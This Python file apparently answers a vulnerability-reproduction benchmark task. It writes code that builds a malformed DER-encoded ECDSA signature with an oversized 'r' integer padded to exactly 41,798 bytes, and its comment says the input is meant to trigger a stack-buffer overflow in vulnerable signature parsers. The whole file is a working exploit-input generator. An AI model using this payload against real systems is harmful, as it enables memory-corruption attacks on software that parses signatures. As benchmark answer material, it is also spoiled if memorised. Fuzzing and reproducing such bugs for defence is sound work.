import os
from typing import Optional


def _encode_der_length(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _make_ecdsa_der_signature(total_size: int, s_bytes: bytes = b"\x01") -> bytes:
    if not (1 <= len(s_bytes) <= 0x7FFFFFFF):
        raise ValueError("bad s length")

    # Build: SEQUENCE { INTEGER r, INTEGER s }
    # Choose r length to make total size exact.
    # Use iterative adjustment because length-of-length depends on chosen r length.
    s_len = len(s_bytes)
    s_block = b"\x02" + _encode_der_length(s_len) + s_bytes

    # Start with a reasonable guess for rLen, then adjust.
    r_len = max(1, total_size - (1 + 3) - (1 + 3) - len(s_block))  # over-approx
    for _ in range(20):
        r_len_enc = _encode_der_length(r_len)
        r_block_len = 1 + len(r_len_enc) + r_len
        seq_content_len = r_block_len + len(s_block)
        seq_len_enc = _encode_der_length(seq_content_len)
        actual_total = 1 + len(seq_len_enc) + seq_content_len
        delta = total_size - actual_total
        if delta == 0:
            break
        r_len = max(1, r_len + delta)
    else:
        raise ValueError("could not fit total size")

    # r value: ensure positive integer with required leading 0x00
    if r_len < 2:
        r_val = b"\x00"
        r_len = 1
    else:
        r_val = b"\x00" + (b"\xff" * (r_len - 1))

    r_block = b"\x02" + _encode_der_length(len(r_val)) + r_val
    seq_content = r_block + s_block
    payload = b"\x30" + _encode_der_length(len(seq_content)) + seq_content

    if len(payload) != total_size:
        # Try to correct by adjusting r length once more (rare due to length-of-length boundaries)
        # Recompute with exact arithmetic by brute force around current r_len.
        base = payload
        for adj in range(-8, 9):
            rr = max(1, (len(r_val) + adj))
            if rr < 1:
                continue
            if rr == 1:
                r_val2 = b"\x01"
            else:
                r_val2 = b"\x00" + (b"\xff" * (rr - 1))
            r_block2 = b"\x02" + _encode_der_length(len(r_val2)) + r_val2
            seq_content2 = r_block2 + s_block
            payload2 = b"\x30" + _encode_der_length(len(seq_content2)) + seq_content2
            if len(payload2) == total_size:
                payload = payload2
                break
        if len(payload) != total_size:
            raise ValueError("final payload size mismatch")

    return payload


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Use a large DER-encoded ECDSA signature (ASN.1 SEQUENCE of two INTEGERs)
        # with an oversized 'r' field to trigger stack-buffer overflow in vulnerable parsers.
        target_len = 41798
        return _make_ecdsa_der_signature(target_len)